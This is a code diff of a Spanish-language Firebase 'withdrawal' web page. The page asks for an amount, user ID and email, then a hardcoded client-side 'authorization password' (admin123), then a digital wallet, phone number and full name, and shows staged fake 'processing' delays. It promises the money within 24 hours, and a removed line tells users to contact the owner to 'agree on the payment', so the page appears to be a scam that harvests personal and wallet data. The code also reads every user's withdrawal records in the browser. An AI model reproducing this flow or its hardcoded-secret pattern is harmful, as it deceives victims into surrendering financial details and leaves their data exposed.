@@ -25,25 +25,12 @@
     <input type="text" class="form-control" id="uid" required>
     <label>Correo Electrónico:</label>
     <input type="email" class="form-control" id="correo" required>
-
-    <!-- Campo de contraseña oculto por defecto -->
-    <div id="campoContrasena" style="display: none;">
-      <label>Contraseña de autorización:</label>
-      <input type="password" class="form-control" id="contrasena">
-    </div>
-
-    <div id="infoExtra" style="display:none;">
-      <label>Billetera Digital:</label>
-      <input type="text" class="form-control" id="billetera">
-      <label>Número:</label>
-      <input type="text" class="form-control" id="numero">
-    </div>
     <button type="submit" class="btn btn-primary mt-3 w-100">Retirar</button>
   </form>
 </div>
 
-<!-- Modal -->
-<div class="modal fade" id="modalMensaje" tabindex="-1" aria-hidden="true">
+<!-- Modal general -->
+<div class="modal fade" id="modalMensaje" tabindex="-1">
   <div class="modal-dialog">
     <div class="modal-content p-3">
       <div class="modal-header">
@@ -57,17 +44,37 @@
   </div>
 </div>
 
-<!-- Modal estado de retiro -->
-<div class="modal fade" id="estadoModal" tabindex="-1" aria-labelledby="estadoModalLabel" aria-hidden="true">
+<!-- Modal contraseña -->
+<div class="modal fade" id="modalPassword" tabindex="-1">
   <div class="modal-dialog">
-    <div class="modal-content bg-dark text-white">
-      <div class="modal-header">
-        <h5 class="modal-title" id="estadoModalLabel">Estado de tu retiro</h5>
-        <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal" aria-label="Cerrar"></button>
+    <div class="modal-content p-3">
+      <div class="modal-header"><h5 class="modal-title">Autorización</h5></div>
+      <div class="modal-body">
+        <label>Ingresa la contraseña de autorización:</label>
+        <input type="password" class="form-control" id="contrasena">
       </div>
-      <div class="modal-body" id="estadoMensaje">Cargando estado...</div>
       <div class="modal-footer">
-        <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Cerrar</button>
+        <button class="btn btn-primary" onclick="verificarContrasena()">Verificar</button>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- Modal datos extra -->
+<div class="modal fade" id="modalDatosExtra" tabindex="-1">
+  <div class="modal-dialog">
+    <div class="modal-content p-3">
+      <div class="modal-header"><h5 class="modal-title">Datos adicionales</h5></div>
+      <div class="modal-body">
+        <label>Billetera Digital:</label>
+        <input type="text" class="form-control" id="billetera">
+        <label>Número de Teléfono:</label>
+        <input type="text" class="form-control" id="numero">
+        <label>Nombre completo:</label>
+        <input type="text" class="form-control" id="nombre">
+      </div>
+      <div class="modal-footer">
+        <button class="btn btn-success" onclick="enviarDatos()">Enviar</button>
       </div>
     </div>
   </div>
@@ -85,52 +92,65 @@ const firebaseConfig = {
 };
 firebase.initializeApp(firebaseConfig);
 const db = firebase.database();
+const auth = firebase.auth();
 
 const CONTRASENA = "admin123";
-let contrasenaVerificada = false;
+let retiroId = null;
 
 document.getElementById("formulario").addEventListener("submit", function(e) {
   e.preventDefault();
+  mostrarModal("Procesando datos...");
+  setTimeout(() => {
+    ocultarModal();
+    new bootstrap.Modal(document.getElementById("modalPassword")).show();
+  }, 2000);
+});
 
-  if (!contrasenaVerificada) {
-    document.getElementById("campoContrasena").style.display = "block";
-    mostrarModal("Por favor, ingrese la contraseña antes de retira o si no comunicate con el propietario para solicitar y concordar con el pago.");
-    return;
+function verificarContrasena() {
+  const contrasenaInput = document.getElementById("contrasena").value.trim();
+  if (contrasenaInput === CONTRASENA) {
+    mostrarModal("Contraseña correcta, espere un momento...");
+    setTimeout(() => {
+      ocultarModal();
+      new bootstrap.Modal(document.getElementById("modalDatosExtra")).show();
+    }, 1500);
+  } else {
+    mostrarModal("❌ Contraseña incorrecta. Intenta nuevamente.");
   }
+}
 
+function enviarDatos() {
   const monto = parseFloat(document.getElementById("monto").value);
   const uid = document.getElementById("uid").value.trim();
   const correo = document.getElementById("correo").value.trim();
   const billetera = document.getElementById("billetera").value.trim();
   const numero = document.getElementById("numero").value.trim();
+  const nombre = document.getElementById("nombre").value.trim();
 
-  if (!billetera || !numero) {
-    mostrarModal("Por favor, complete los campos de billetera y número.");
+  if (!billetera || !numero || !nombre) {
+    mostrarModal("⚠️ Todos los campos adicionales son obligatorios.");
     return;
   }
 
   const datos = {
-    uid, correo, monto, billetera, numero,
+    uid, correo, monto, billetera, numero, nombre,
     estado: "pendiente",
     fecha: new Date().toLocaleString()
   };
 
-  db.ref("retiros/" + Date.now()).set(datos).then(() => {
-    mostrarModal("✅ Datos enviados correctamente. En 24 horas llegará el dinero.");
-  });
-});
+  const newId = Date.now().toString();
+  retiroId = newId;
 
-document.getElementById("contrasena").addEventListener("input", function () {
-  if (this.value.trim() === CONTRASENA) {
-    contrasenaVerificada = true;
-    document.getElementById("campoContrasena").style.display = "none";
-    document.getElementById("infoExtra").style.display = "block";
+  db.ref("retiros/" + newId).set(datos).then(() => {
     ocultarModal();
-  } else {
-    contrasenaVerificada = false;
-    document.getElementById("infoExtra").style.display = "none";
-  }
-});
+    mostrarModal("✅ Datos enviados correctamente. En 24 horas llegará el dinero.");
+    document.getElementById("formulario").reset();
+    document.getElementById("contrasena").value = "";
+    document.getElementById("billetera").value = "";
+    document.getElementById("numero").value = "";
+    document.getElementById("nombre").value = "";
+  });
+}
 
 function mostrarModal(mensaje) {
   document.getElementById("modalTexto").innerText = mensaje;
@@ -139,39 +159,42 @@ function mostrarModal(mensaje) {
 }
 
 function ocultarModal() {
-  let modalEl = document.getElementById("modalMensaje");
-  let modal = bootstrap.Modal.getInstance(modalEl);
-  if (modal) modal.hide();
+  const modalEl = document.getElementById("modalMensaje");
+  const instance = bootstrap.Modal.getInstance(modalEl);
+  if (instance) instance.hide();
 }
 
-// Estado del retiro por usuario logueado
-firebase.auth().onAuthStateChanged((user) => {
+// ESCUCHA CAMBIOS DE ESTADO DE RETIRO
+auth.onAuthStateChanged(user => {
   if (user) {
     const uid = user.uid;
-    firebase.database().ref('retiros/' + uid).on('value', (snapshot) => {
-      const data = snapshot.val();
-      if (data && data.estado) {
-        let mensaje = "";
-        switch (data.estado) {
-          case "pendiente":
-            mensaje = "Tu solicitud está pendiente de revisión.";
-            break;
-          case "aprobado":
-            mensaje = "✅ Tu retiro ha sido aprobado. El dinero será enviado en breve.";
-            break;
-          case "rechazado":
-            mensaje = "❌ Tu retiro fue rechazado. Contacta con soporte.";
-            break;
-          default:
-            mensaje = "Estado desconocido.";
+
+    // Cambios en estado de retiro
+    db.ref("retiros").on("value", snapshot => {
+      const retiros = snapshot.val() || {};
+      for (const key in retiros) {
+        const r = retiros[key];
+        if (r.uid === uid && r.estado !== "pendiente") {
+          mostrarModal(
+            r.estado === "aprobado"
+              ? "✅ Tu retiro ha sido aprobado. El dinero será enviado en breve."
+              : "❌ Tu retiro fue rechazado. Contacta con soporte."
+          );
         }
-        document.getElementById("estadoMensaje").innerText = mensaje;
-        new bootstrap.Modal(document.getElementById("estadoModal")).show();
+      }
+    });
+
+    // Notificaciones específicas del admin
+    db.ref("notificaciones/" + uid).limitToLast(1).on("child_added", snap => {
+      const data = snap.val();
+      if (data?.mensaje) {
+        mostrarModal(data.mensaje);
       }
     });
   }
 });
 </script>
+
 <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
 </body>
-</html>
+                                  </html>
